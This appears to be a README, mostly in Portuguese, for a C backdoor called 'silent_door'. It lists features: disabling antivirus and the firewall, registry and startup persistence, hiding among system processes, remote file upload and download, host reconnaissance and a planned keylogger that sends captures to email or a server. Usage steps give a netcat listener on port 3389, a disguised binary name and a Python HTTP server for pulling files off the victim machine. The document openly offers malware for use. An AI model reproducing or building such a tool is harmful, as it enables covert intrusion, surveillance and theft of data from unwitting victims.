# silent_door

# Clássico backdoor, escrito na linguagem C.
 
# Em desenvolvimento.

Classic backdoor, write in c language.

In desenvolpment.  

# Funções: 

# auto executáveis -> executam-se automaticamente após a instalação

(#) desativar anti-vírus (caso exista) 

(#) desativar firewall (abrir portas, redirecionar etc)

(#) copiar o software para o registro da máquina alvo 

(#) copiar o software para inicialização junto aos demais programas, assim tendo a conexão ativa quando a máquina for religada

(#) fork para criar um deamon, para rodar no background 

(#) invisível, ao ser executado nada ocorre e os processos associam-se a processos originais do sistema

(#) conexão remota 

#######################################################################################################

# Funções arbitrárias:

# executadas pelo servidor (o qual está em desenvolvimento!) 

(#) enviar arquivo para a máquina alvo

(#) fazer download de arquivos da máquina

( ) inicializar keylogger em modo passivo, enviando os arquivos para e-mail e/ou direto para o servidor. 

 *OBS: Keylogger com tais funções já está pronto. 

(#) informações sobre: ip, nome da máquina etc

( ) informações sobre: a rede da máquina alvo ( outras máquinas conectadas à mesma rede)
 
.... e muito mais por vir!

######################################################################################################

No arquivo requirements.txt estão as bibliotecas necessárias

Caso queira instalar e compilar automaticamente, execute o script sdinstall.sh, contido na pasta install  

# Uso (improvisado): 

1. nc -lvp 3389 

2. ./silent_door (ou ./wine.01.2 ou outro nome qualquer definido) 

3. a conexão é estabelecida  

# Pode ser útil (porém não recomendado):

4. python -m SimpleHTTPServer 3389

Abrindo o diretório atual, para visualização e download dos arquivos

5. Nesse ponto em diante, use suas habilidades 

Sugiro abrir uma nova conexão no backdoor com netcat

Assim como ler a documentação do netcat: man netcat 

enfim, isso está sendo aprimorado 

Paz, 

mrx6SO
